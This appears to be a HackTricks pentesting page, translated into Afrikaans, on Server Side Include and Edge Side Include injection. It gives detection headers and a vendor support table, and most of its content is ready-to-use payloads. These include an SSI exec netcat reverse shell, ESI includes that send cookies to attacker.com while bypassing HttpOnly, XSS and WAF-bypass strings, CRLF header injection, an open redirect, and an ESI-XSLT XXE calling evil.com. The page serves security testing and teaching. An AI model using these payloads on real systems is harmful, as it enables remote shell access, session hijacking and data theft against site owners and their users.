# Server Side Inclusion/Edge Side Inclusion Injection

{{#include ../banners/hacktricks-training.md}}

## Server Side Inclusion Basiese Inligting

**(Inleiding geneem uit** [**Apache docs**](https://httpd.apache.org/docs/current/howto/ssi.html)**)**

SSI (Server Side Includes) is riglyne wat in HTML-bladsye geplaas word, en op die bediener geëvalueer word terwyl die bladsye bedien word. Dit laat jou toe om dinamies gegenereerde inhoud by 'n bestaande HTML-bladsy te voeg, sonder om die hele bladsy via 'n CGI-program of ander dinamiese tegnologie te bedien.\
Byvoorbeeld, jy mag 'n riglyn in 'n bestaande HTML-bladsy plaas, soos:

`<!--#echo var="DATE_LOCAL" -->`

En, wanneer die bladsy bedien word, sal hierdie fragment geëvalueer word en met sy waarde vervang word:

`Dinsdag, 15-Jan-2013 19:28:54 EST`

Die besluit oor wanneer om SSI te gebruik, en wanneer om jou bladsy heeltemal deur 'n program te laat genereer, is gewoonlik 'n kwessie van hoeveel van die bladsy staties is, en hoeveel elke keer herbereken moet word wanneer die bladsy bedien word. SSI is 'n uitstekende manier om klein stukke inligting by te voeg, soos die huidige tyd - soos hierbo getoon. Maar as 'n meerderheid van jou bladsy gegenereer word op die tydstip dat dit bedien word, moet jy na 'n ander oplossing soek.

Jy kan die teenwoordigheid van SSI aflei as die webtoepassing lêers met die uitbreidings **`.shtml`, `.shtm` of `.stm`** gebruik, maar dit is nie die enigste geval nie.

'n Tipiese SSI-uitdrukking het die volgende formaat:
```
<!--#directive param="value" -->
```
### Kontroleer
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

Daar is 'n probleem **met die kas van inligting of dinamiese toepassings** aangesien die inhoud **verskillend** mag wees vir die volgende keer dat die inhoud opgehaal word. Dit is waarvoor **ESI** gebruik word, om aan te dui met ESI-tags die **dinamiese inhoud wat gegenereer moet word** voordat die kasweergawe gestuur word.\
As 'n **aanvaller** in staat is om 'n **ESI-tag** binne die kasinhoud te **injekteer**, kan hy in staat wees om **arbitraire inhoud** in die dokument te **injekteer** voordat dit aan die gebruikers gestuur word.

### ESI Detection

Die volgende **kop** in 'n antwoord van die bediener beteken dat die bediener ESI gebruik:
```
Surrogate-Control: content="ESI/1.0"
```
As jy hierdie kop nie kan vind nie, **kan die bediener steeds ESI gebruik**.\
'n **blindeksploitasi benadering kan ook gebruik word** aangesien 'n versoek na die aanvallers bediener moet aankom:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI-uitbuiting

[GoSecure het geskep](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) 'n tabel om moontlike aanvalle te verstaan wat ons teen verskillende ESI-ondersteunde sagteware kan probeer, afhangende van die funksionaliteit wat ondersteun word:

- **Includes**: Ondersteun die `<esi:includes>` riglyn
- **Vars**: Ondersteun die `<esi:vars>` riglyn. Nuttig om XSS-filters te omseil
- **Cookie**: Dokumentkoekies is beskikbaar vir die ESI-enjin
- **Opwaartse Koppe Vereis**: Surrogaat toepassings sal nie ESI-verklarings verwerk nie tensy die opwaartse toepassing die koppe verskaf
- **Gashere-toegestaanlys**: In hierdie geval is ESI-includes slegs moontlik vanaf toegelate bediener-gashere, wat SSRF byvoorbeeld slegs teen daardie gashere moontlik maak

|         **Sagteware**         | **Includes** | **Vars** | **Koekies** | **Opwaartse Koppe Vereis** | **Gashere-toegestaanlys** |
| :----------------------------: | :----------: | :------: | :---------: | :------------------------: | :-----------------------: |
|            Squid3             |     Ja       |   Ja     |     Ja      |             Ja             |          Nee             |
|        Varnish Cache          |     Ja       |   Nee    |     Nee     |             Ja             |          Ja              |
|            Fastly             |     Ja       |   Nee    |     Nee     |             Nee            |          Ja              |
| Akamai ESI Toetsbediener (ETS) |     Ja       |   Ja     |     Ja      |             Nee            |          Nee             |
|          NodeJS esi           |     Ja       |   Ja     |     Ja      |             Nee            |          Nee             |
|        NodeJS nodesi          |     Ja       |   Nee    |     Nee     |             Nee            |       Opsioneel          |

#### XSS

Die volgende ESI-riglyn sal 'n arbitrêre lêer binne die antwoord van die bediener laai
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Om klante XSS-beskerming te omseil
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Steel Koekie

- Afgeleë steel koekie
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
- Steel koekie HTTP_ONLY met XSS deur dit in die antwoord te reflekteer:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Private Local File

Moet dit nie verwar met 'n "Local File Inclusion" nie:
```html
<esi:include src="secret.txt">
```
#### CRLF
```html
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

Die volgende sal 'n `Location` kop aan die antwoord voeg
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Voeg Kop In

- Voeg kop in gedwonge versoek
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
- Voeg 'n kop in die antwoord by (nuttig om "Content-Type: text/json" in 'n antwoord met XSS te omseil)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF in Add header (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

Dit sal foutopsporing-inligting wat in die antwoord ingesluit is, stuur:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Dit is moontlik om **`eXtensible Stylesheet Language Transformations (XSLT)`** sintaksis in ESI te gebruik deur net die param **`dca`** waarde as **`xslt`** aan te dui. Dit mag toelaat om **XSLT** te misbruik om 'n XML Eksterne Entiteit kwesbaarheid (XXE) te skep en te misbruik:
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT-lêer:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Kontroleer die XSLT-bladsy:

{{#ref}}
xslt-server-side-injection-extensible-stylesheet-language-transformations.md
{{#endref}}

### Verwysings

- [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
- [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
- [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Brute-Force Opsporing Lys

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt
{{#endref}}

{{#include ../banners/hacktricks-training.md}}
